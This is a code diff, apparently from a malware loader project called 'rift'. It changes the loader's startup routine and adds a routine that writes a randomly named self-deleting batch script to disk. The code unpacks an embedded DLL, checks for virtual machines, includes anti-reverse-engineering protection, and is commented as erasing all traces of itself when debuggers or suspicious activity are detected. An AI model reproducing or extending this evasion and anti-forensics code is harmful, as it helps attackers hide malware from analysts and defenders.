@@ -7,21 +7,23 @@ INT WINAPI wWinMain(
 	_In_     PWSTR     pCmdLine,
 	_In_     INT       nCmdShow
 ) {
+	// Initialize Global Values
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(nCmdShow);
-	g_hmMH = hInstance;
-	GetModuleFileNameW(hInstance, g_szMFN, sizeof(g_szMFN) / sizeof(*g_szMFN));
-	GetCurrentDirectoryW(sizeof(g_szCD) / sizeof(*g_szCD), g_szCD);
+	g_hMH = hInstance;
+	GetModuleFileNameW(hInstance, g_szMFN, MAX_PATH);
+	GetCurrentDirectoryW(MAX_PATH, g_szCD);
 	g_hPH = GetProcessHeap();
 
 #ifndef _DEBUG
+	// Protect Process
 	BOOL bRE = fnAntiRE();
 #endif
-	fnAdjustPrivilege(SE_DEBUG_NAME, TRUE);
-	BOOL bVM = fnCheckVMPresent();
 
 	fnInitializeXSR();
 	fnOpenConsole();
+
+	BOOL bVM = fnCheckVMPresent();
 
 	SIZE_T nDll;
 	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
@@ -58,13 +60,38 @@ INT WINAPI wWinMain(
 	all traces of it self (the loader and everything else it extracts).
 	It should get triggered ( / called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
-const BYTE szSelfDelBat[] = {
-	"@echo off\n%s:\n\
-	del \"%s\" /f\
-	\tif exist \"%s\" (\n\
-	\t\tgoto %s\n\t)\n\
-	del \"%s\" / f"
+const static WCHAR szSelfDelBat[] = {
+	L"@echo off\n"
+	L"%x:\n"
+	L"\tdel \"%s\" /f\n"
+	L"\tif exist \"%s\" (\n"
+	L"\t\tgoto %x\n"
+	L"\t)\n"
+	L"del \"%s\" /f"
 };
 VOID fnPurge() {
+	// Prepare String for Filename of Batchfile
+	PWSTR szFilePath = (PWSTR)HeapAlloc(g_hPH, 0, MAX_PATH);
+	SIZE_T nRandom;
+	PCWSTR szRandom = fnAllocRandomStringW(8, 16, &nRandom);
+	CopyMemory(szFilePath, g_szCD, MAX_PATH);
+	PathCchAppend(szFilePath, MAX_PATH, szRandom);
+	PathCchAddExtension(szFilePath, MAX_PATH, L".bat");
 
+	// Prepare Script content
+	PVOID pScriptW = HeapAlloc(g_hPH, 0, 0x800);
+	UINT uiRandomID = fnNext128ss();
+	PCWSTR szMFN = fnGetFileNameFromPathW(g_szMFN);
+	StringCchPrintfW(pScriptW, 0x400, szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));
+
+	// Convert to Raw (ANSI)
+	SIZE_T nScript;
+	StringCchLengthW(pScriptW, 0x400, &nScript);
+	PSTR pScriptA = (PSTR)HeapAlloc(g_hPH, 0, 0x400);
+	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
+	HeapFree(g_hPH, 0, pScriptW);
+
+	// Write to Disk
+	fnWriteFileW(szFilePath, pScriptA, nScript);
+	HeapFree(g_hPH, 0, pScriptA);
 }
